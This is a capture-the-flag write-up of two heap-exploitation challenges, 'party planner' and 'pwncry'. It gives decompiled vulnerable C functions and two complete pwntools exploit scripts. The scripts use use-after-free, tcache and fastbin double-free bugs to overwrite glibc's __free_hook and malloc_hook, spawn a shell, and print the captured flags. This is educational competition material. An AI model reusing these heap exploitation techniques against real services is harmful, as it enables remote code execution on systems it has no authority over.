# Inctf pwn writeups.

#### I played with team `from sousse with love` and i worked on pwn challenges, our team got 9th on the ctf. And i was able to solve only two challenges.

![](https://i.imgur.com/IVEffDq.png)

Here are the quick overview on challenges i solved during ctf.

## party planner

######  points - 723, solves - 25

The challenge was pretty much good.
libc version 2.29 which has additional checks for tcache.

The program used two structures.
I defined structures in IDA to ease things up.
![](https://i.imgur.com/OFyGHjT.png)

The functions were pretty much easy to reverse.

![](https://i.imgur.com/cuUUmQf.png)

Two structures, We can Create max two house, 20 person, we can add maximum 10 person in each house.
It took me some time to notice the bug.

View person takes an IDX and prints the person info.
```c
int view_person()
{
  unsigned int houseidx; // [rsp+8h] [rbp-8h]
  int person_idx; // [rsp+Ch] [rbp-4h]

  printf("Which House (0 or 1) ? : ");
  houseidx = return_number();
  if ( !house[houseidx] || houseidx > 1 )
    exit_with_read("No such House");
  printf("Enter the Person number : ");
  person_idx = return_number();
  if ( houseidx )
  {
    if ( !house_people1[person_idx] )
      exit_with_read("No such Person");
    assigner = house_people1[person_idx];
  }
  else
  {
    if ( !house_people_0[person_idx] )
      exit_with_read("No such Person");
    assigner = house_people_0[person_idx];
  }
  return printf("Name of Person %d is %s\n", assigner->count, assigner);
//It doesn't Initialize the assigner back.
}
```
```c
struct person_ **remove_person_from_house()
{
  struct person_ **result; // rax
  unsigned int house_idx; // [rsp+8h] [rbp-8h]
  int personidx; // [rsp+Ch] [rbp-4h]

  printf("Which House (0 or 1) ? : ");
  house_idx = return_number();
  if ( !house[house_idx] || house_idx > 1 )
    exit_with_read("No such House");
  printf("Enter the Person number : ");
  personidx = return_number();
  if ( !assigner )
  {
    if ( house_idx )
    {
      if ( !house_people1[personidx] )
        exit_with_read("No such Person");
      assigner = house_people1[personidx];
    }
    else
    {
      if ( !house_people_0[personidx] )
        exit_with_read("No such Person");
      assigner = house_people_0[personidx];
    }
  }
  if ( house_idx )
  {
    if ( !assigner->in_house_ )
      exit_with_read("Something went wrong");
    assigner->in_house_ = 0;
    free(assigner->person_description);
    free(assigner);
    result = house_people1;
    house_people1[personidx] = 0LL;
  }
  else
  {
    if ( !assigner->in_house_ )
      exit_with_read("Something went wrong");
    assigner->in_house_ = 0;
    free(assigner->person_description);
    free(assigner);
    result = house_people_0;
    house_people_0[personidx] = 0LL;
  }
  assigner = 0LL;
  return result;
}
```
The remove_person function first checks house_idx to with zero.
But if our `assigner` variable is set, it will free the assigner variable and sets person_idx to NULL.
And it will not initialize the freed person as in the assigner.

it gets messed up in party function, which will remove all person from the house, as in free the chunks, and back there in remove_person function using the bug we can free different chunk we want.
Without initializing it.

```c
  }
  if ( houseidx )
  {
    for ( i_ = 0; i_ <= 9; ++i_ )
    {
      if ( house_people1[i_] )
      {
        free(house_people1[i_]->person_description);
        free(house_people1[i_]);
        house_people1[i_] = 0LL;
      }
    }
  }
  else
  {
    for ( j_ = 0; j_ <= 9; ++j_ )
    {
      if ( house_people_0[j_] )
      {
        free(house_people_0[j_]->person_description);
        free(house_people_0[j_]);
        house_people_0[j_] = 0LL;
      }
    }
  }
  return puts("\n\nParty is over\nAll people have left\n");
}
```
Keeping this in mind.
Leaking libc was simple knowing above things, With print_house function.
Leaking heap was also simple.
I added an `__free_hook` entry to the tcache_per_thread struct.
using the bug.
Overwrite it with system.
#### exploit.

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')

host = args.HOST or '35.245.143.0'
port = int(args.PORT or 5555)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv,aslr=False, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())
io = start()

def createhouse(name, size, desc):
	io.sendlineafter('>> ','1')
	io.sendafter('House : ',name)
	io.sendlineafter('of House : ',str(size))
	io.sendafter('description : ',desc)

def createperson(name,size,desc):
	io.sendlineafter('>> ','2')
	io.sendafter('Person :',name)
	io.sendlineafter('of Person : ',str(size))
	io.sendafter('details : ',desc)

def addperson(personidx,houseidx):
	io.sendlineafter('>> ','3')
	io.sendlineafter('number : ',str(personidx))
	io.sendlineafter('? : ',str(houseidx))

def removeperson(personidx,houseidx):
	io.sendlineafter('>> ','4')
	io.sendlineafter('? : ',str(houseidx))
	io.sendlineafter('number : ',str(personidx))

def viewhouse(houseidx):
	io.sendlineafter('>> ','5')
	io.sendlineafter('? : ',str(houseidx))

def viewperson(personidx, houseidx):
	io.sendlineafter('>> ','6')
	io.sendlineafter('? : ',str(houseidx))
	io.sendlineafter('number : ',str(personidx))

def party(houseidx):
	io.sendlineafter('>> ','7')
	io.sendlineafter('? : ',str(houseidx))

def destroy(houseidx):
	io.sendlineafter('>> ','8')
	io.sendlineafter('? : ',str(houseidx))

free_hook = 0x1e75a8
malloc_hook = 0x1e4c30
system = 0x52fd0

createhouse('A'*0x20,0x18,'HKHK')
for i in range(2):
	createperson('ZZZ',0x18,'HKHK')
createperson('/bin/sh\x00',0x18,'vvv')
for i in range(5):
	createperson('HKHK',0x18,'HKHK')
createperson('HKHK',0x418,'HKHK')
createperson('HKHK',0x38,'HKHK')
for i in range(10):
	addperson(i,0)
viewperson(8,0)
removeperson(0,0)
viewhouse(0)
io.recvuntil('Person 8   with details  ')
libc_base = u64(io.recvn(6)+'\x00\x00')-0x1e4ca0
log.info('Libc base {}'.format(hex(libc_base)))
viewperson(9,0)
removeperson(1,0)
viewhouse(0)
io.recvuntil('Person 9  ')
heap_base = u64(io.recvn(6)+'\x00\x00')-0xa60
log.info('Heap leak {}'.format(hex(heap_base)))
for i in range(9):
	createperson('HKHK',0x38,'HKHK')
createperson('HKHK',0x418,'HKHK')
createhouse('HKHK',0x18,'HKHK')
for i in range(10):
	addperson(i,1)
for i in range(4):
	removeperson(i,1)
viewperson(5,1)
removeperson(6,1) #delete 5 here
removeperson(7,1)
party(1)
for i in range(3):
	createperson('AAAA',0x38,'BBBB')
for i in range(2):
	createperson('BBBB',0x38,'CCCC')
createperson('AAAA',0x38,'DDDD')
createperson(p64(heap_base+0x60),0x38,'DDDD')
createperson('DDDD',0x38,'KKKK')
createperson(p64(libc_base + free_hook),0x38,'GGGG')
createperson('HKHKK',0x58,p64(libc_base+system))
viewperson(2,0)
removeperson(0,0)
io.interactive()
#inctf{m3h_th4t_w4s_a_trivial_bug_7734736f615f472}
```

## pwncry

##### points - 964, solves - 10
This challenge was pretty simple. (`Meh` Didn't had much satisfaction after solving it./)
The challenge contained two part. Crypto and pwn
I had help of my team-mate `kiona` with the crypto-part
and pwn was pretty simple.

It encrypts the data we send with AES-CBC mode,
The crypto part to solve was, there was a random key on the remote service, which we can leak the key,
libc version 2.23, and the bug easy to find,
but data we send gets encrypted before it gets copied into our buffer, hmmm?
Is there a way around this ?
Yes we can Keep the exact data we want inside the chunk, I had help of our crypto guy on this. But for this we need the key on the remote server.
The binary prints the IV at start,
Asks us a three letters at the start, encrypts it and prints it back, 

Four functions,
Change-name,delete,add,exit.
,we can delete same idx twice. :face_vomiting: 
Max size of the chunk was 0x70 to allocate,
it allocates `input_size + 16` so if we allocte give size 0x68 it alloctes `malloc(0x68 + 16)` freeing this chunk would give unsorted bin, If we allocate back and send '\x00' as our data, The chunks data doesn't gets corrupted. and leak libc from here.
Next part was easy, libc 2.23 and fast-bin duplicate. :hammer: 

I changed malloc_hook with one_gadget.

#### exploit.
```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from Crypto.Cipher import AES
from binascii import unhexlify, hexlify

exe = context.binary = ELF('./chall')

host = args.HOST or '35.245.143.0'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv,env={'LD_PRELOAD':'./libc.so.6'}, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#---

io = start()
io.recvuntil('IV:')
IV = io.recvn(32)
if args.LOCAL:
	KEY = 'YELLOWSUBMARINES'
else:
	KEY = '\x59\x49\xee\xbb\x28\xe0\xdf\x11\xfe\xac\x0b\x73\xbd\xb4\xdb\xa2'
log.info('IV: {}'.format(IV))
io.recvuntil(':')
io.sendline('AAA')

#helpers
def enc(data):
	text = AES.new(KEY,AES.MODE_CBC,unhexlify(IV))
	return hexlify(text.encrypt(data))

def check(data):
	j = AES.new(KEY,AES.MODE_CBC,unhexlify(IV))
	return hexlify(j.encrypt(data))

def dec(data):
	j = AES.new(KEY,AES.MODE_CBC,unhexlify(IV))
	return j.decrypt(data)


def conceal(idx,size,data):
	io.sendlineafter('ID:',str(idx))
	io.sendlineafter('quest\n','1')
	io.sendlineafter('size:\n',str(size))
	io.sendlineafter('plaintext:',data)

def remove(idx):
	io.sendlineafter('ID:',str(idx))
	io.sendlineafter('quest\n','3')

def changename(data):
	io.sendlineafter('ID:','1')
	io.sendlineafter('quest\n','2')
	io.sendafter('name:',data)
	io.sendlineafter('IV(16 bytes):',unhexlify(IV))

def mypad(data):
	s = len(data)
	if s<16:
		for i in range(s,16):
			data += '\x00'
	return data

def tosend(data):
	return dec(mypad(data))

def send(data):
	s = len(data)
	if s<32:
		for i in range(s,32):
			data += '\x00'	
	cipher = AES.new(KEY, AES.MODE_CBC, unhexlify(IV))
	return cipher.decrypt(data)

def getshell():
	io.recv()
	io.sendline('9')
	io.recv()
	io.sendline('1')
	io.recv()
	io.sendline('10')
	io.recv()
	io.sendline('1')

malloc_hook = 0x3c4b10
#0x4527a,0xf0364,0xf1207

conceal(1,0x70,tosend('HKHK'))
conceal(2,0x58,tosend('HKHK'))
conceal(3,0x58,tosend('HKHK'))
remove(1)
remove(2)
remove(3)
remove(2)
conceal(4,0x70,'\x00')
io.recvuntil('concealed!\n')
libc_base = u64(unhexlify(io.recvn(12))+'\x00\x00')-0x3c4b78
log.info('Libc leak: {}'.format(hex(libc_base)))
conceal(5,0x58,tosend(p64(libc_base+malloc_hook-0x23)))
conceal(6,0x58,tosend('HKHK'))
conceal(7,0x58,tosend('HKHK'))
conceal(8,0x58,send('A'*(32-13)+p64(libc_base+0x4527a)))
getshell()
#inctf{th4t5_4ll_f0lks_say_th3_bUgs_b1daf2789929}
io.interactive()
```
